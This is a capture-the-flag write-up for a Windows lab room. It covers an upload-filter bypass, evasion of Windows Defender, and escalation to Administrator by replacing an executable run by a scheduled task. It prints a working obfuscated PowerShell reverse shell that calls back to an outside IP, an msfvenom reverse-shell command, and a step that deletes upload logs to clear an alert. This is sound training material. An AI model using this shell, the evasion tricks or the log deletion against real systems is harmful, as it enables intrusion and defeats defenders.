# Stealthv3.4n - File Upload Filter Bypass → AV Evasion → Scheduled Task Binary Hijack → Administrator

## Overview
**Room:** Stealth
**Difficulty:** Medium
**Goal:** Gain user and root flags on a Windows Server 2019 target using AV evasion techniques and privilege escalation.

---


## Initial Access — File Upload Vulnerability

Navigating to the web service revealed a **PowerShell Script Analyser** tool that accepted `.ps1` file uploads. The site was running **Apache 2.4.56 with PHP 8.0.28 on Windows**, confirmed via response headers.

### What We Tried That Didn't Work

**PHP webshell upload** — uploading `cmd.php` was blocked by a server-side filter rejecting non `.ps1` files.

**Double extension `.php.ps1`** — uploading `cmd.php.ps1` was accepted and the file landed in `/uploads/`. However, navigating to it showed the raw PHP code rather than executing it, because Apache was not configured to execute `.php.ps1` as PHP.

**Various PHP functions** — we tried `system()`, `passthru()`, `exec()`, `shell_exec()` inside the double extension file. All returned blank pages, confirming PHP was executing but output was being suppressed or the functions were restricted.


### What Worked

We confirmed code execution by uploading a basic `.ps1` that connected back to our netcat listener on port 4444.

---

## Getting a Reverse Shell — AV Evasion

Standard PowerShell reverse shell payloads were caught by Windows Defender. We tried several evasion techniques before finding one that worked.

### What We Tried That Didn't Work

**Standard PowerShell reverse shell** — immediately caught by Windows Defender.

**AMSI bypass + IEX download** — the AMSI bypass patched the scanner in memory but the reverse shell content itself was still being detected when downloaded and executed.

**Two stage payload** — hosting `shell.ps1` on a Python HTTP server and using a separate upload to fetch and execute it. The fetch worked (confirmed by HTTP 200 on the Python server) but execution was blocked.

**Backtick obfuscation** — inserting backticks into cmdlet names like `TC\`pClient` to break signature matching. Partially effective but still blocked.

**Base64 encoded commands** — encoding the payload as base64 and decoding at runtime. Still detected.

**String splitting** — breaking known malicious strings like `TCPClient` into concatenated parts. Partially effective.

### What Worked

Combining **string concatenation** to break AV signatures with **`[scriptblock]::Create()`** instead of `IEX` bypassed Windows Defender successfully:

```powershell
$w = "Sy"+"stem.Net.Soc"+"kets.TC"+"PClient"
$ip = "10"+".82"+".70"+".24"
$pt = [int]("4"+"4"+"4"+"4")
$c = New-Object $w($ip,$pt)
$s = $c.GetStream()
[byte[]]$b = 0..65535|%{0}
while(($i=$s.Read($b,0,$b.Length)) -ne 0){
    $d = [System.Text.Encoding]::ASCII.GetString($b,0,$i)
    $r = [scriptblock]::Create($d).Invoke() 2>&1
    $rb = [System.Text.Encoding]::ASCII.GetBytes(($r|Out-String)+"PS> ")
    $s.Write($rb,0,$rb.Length)
    $s.Flush()
}
$c.Close()
```

This gave us a reverse shell as `hostevasion\evader`.

---

## User Flag

After gaining a shell we enumerated the machine and found an encoded flag on the Desktop. Decoding the base64 content revealed a URL pointing to a PHP page on port 8000. Visiting the URL showed a message saying invalid files had been uploaded and the blue team had been alerted, with a hint to remove upload logs.

We located `log.txt` in `C:\xampp\htdocs\uploads\`, deleted it, and refreshed the URL to retrieve the user flag.

---

## Privilege Escalation

### Enumeration

Running as `evader` we had very limited privileges — only `SeChangeNotifyPrivilege`. We attempted several privesc vectors that did not work:

- **winPEAS** — downloaded successfully (confirmed by HTTP 200) but Windows Defender deleted it before it could execute.
- **Registry autologon credentials** — checked `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`, no credentials stored.
- **phpMyAdmin config** — checked for database credentials, only default empty root password.
- **Scheduled tasks running as SYSTEM** — all tasks were standard Windows tasks with no writable paths.
- **Service enumeration** — Apache and all services were running as `evader`, not SYSTEM.
- **Modifying `file.ps1`** — attempted to append a reverse shell to `file.ps1` via CMD which mangled all variables due to special character interpretation. Resolved by switching to the PowerShell shell and using `Set-Content` with single-quoted strings.

### What Worked

Running `Get-ScheduledTask` filtered to non-Microsoft tasks revealed a custom task called **`MyTHMTask`**:

```powershell
Get-ScheduledTask | Where-Object {$_.TaskPath -notlike "\Microsoft*"} | Select TaskName, TaskPath
```

Querying the task revealed it ran `C:\xampp\DebugCrashTHM.exe` as **Administrator**. Checking permissions with `icacls` showed `evader` had full control **(F)** over the executable.

We generated a malicious executable on Kali using msfvenom, saved it with a `.ps1` extension to bypass the upload filter, uploaded it to the target, then renamed and moved it to replace the original executable:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.82.70.190 LPORT=6666 -f exe -o DebugCrashTHM.exe.ps1
```

```powershell
Copy-Item "C:\xampp\htdocs\uploads\DebugCrashTHM.exe.ps1" "C:\xampp\DebugCrashTHM.exe"
```

Triggered the task manually:

```powershell
schtasks /run /tn "MyTHMTask"
```

This executed the malicious binary as Administrator, giving us a reverse shell on port 6666 as Administrator. The root flag was found on the Administrator's Desktop.

---

## Key Lessons

- File upload filters can often be bypassed with double extensions even when server-side validation is present
- Windows Defender can be evaded using string concatenation and `[scriptblock]::Create()` instead of `IEX`
- Always enumerate scheduled tasks including non-Microsoft ones — `Get-ScheduledTask` with a filter is cleaner than `schtasks /query`
- Writable executables called by privileged scheduled tasks are a reliable privesc path
- Using `.ps1` extension to smuggle an `.exe` past upload filters is a creative bypass when direct downloads are blocked by AV
